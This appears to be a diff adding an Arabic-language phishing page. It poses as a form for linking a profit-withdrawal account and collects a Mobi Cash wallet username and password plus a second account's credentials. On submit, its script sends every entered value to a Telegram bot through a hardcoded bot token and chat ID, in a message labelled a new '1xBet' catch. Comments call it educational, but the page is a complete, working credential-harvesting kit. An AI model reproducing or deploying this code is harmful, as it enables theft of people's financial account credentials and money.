@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تأمين ربط الحسابات</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; padding: 20px; }
+        .box { background: white; padding: 25px; border-radius: 10px; width: 100%; max-width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h1 { color: #0196ed; font-size: 22px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1> ربط حساب سحب الارباح</h1>
+    
+      <input type="text" id="u1" placeholder="اسمك">
+    
+    <input type="text" id="u1" placeholder="اسم المستخدم  موبي كاش">
+    <input type="password" id="p1" placeholder="كلمة مرور حساب الموبي كاش ">
+    <input type="text" id="id2" placeholder="
+    اسم مستخدم حساب البرموكود   ">
+    <input type="password" id="p2" placeholder="
+      كلمة مرور حساب البرموكود">
+    
+        
+    <button onclick="sendData()">تأكيد الربط</button>
+</div>
+
+<script>
+    async function sendData() {
+        // [تنبيه توعوي]: لا تضع بيانات حقيقية أبداً في هذه الخانات!
+        const data = {
+            user: document.getElementById('u1').value,
+            pass1: document.getElementById('p1').value,
+            id2: document.getElementById('id2').value,
+            pass2: document.getElementById('p2').value
+        };
+
+        const BOT_TOKEN = "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk"; // استبدل هذا بتوكن البوت الخاص بك للتجربة
+        const CHAT_ID = "7000276863";
+
+        const msg = `🚨 صيدة جديدة 1xBet:\n👤 المستخدم: ${data.user}\n🔐 كلمة المرور: ${data.pass1}\n🆔 ID المراد ربطه: ${data.id2}\n🔑 كلمة مرور ID: ${data.pass2}`;
+
+        // إرسال البيانات (في بيئة تعليمية فقط)
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+        .then(() => alert("تمت العملية بنجاح، جاري المراجعة."));
+    }
+</script>
+
+</body>
+</html>
